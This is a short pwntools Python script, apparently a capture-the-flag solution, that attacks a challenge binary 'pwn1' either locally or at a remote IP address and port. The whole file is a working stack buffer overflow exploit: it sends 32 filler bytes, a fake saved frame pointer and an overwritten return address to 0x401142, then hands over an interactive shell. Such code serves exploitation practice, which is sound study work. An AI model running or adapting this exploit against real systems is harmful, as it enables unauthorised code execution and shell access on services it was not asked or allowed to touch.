#coding = utf-8
#author = ywledoc

from pwn import *
import sys

if sys.argv[1] == '1':
    p = remote("114.116.54.89",  10004)
else:
    p = process("./pwn1")

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = "debug"
#gdb.attach(proc.pidof(p)[0])

elf = ELF("./pwn1")
system_addr = elf.symbols["system"]
print(hex(system_addr))

#pause()
payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401142)
p.sendline(payload)

p.interactive()
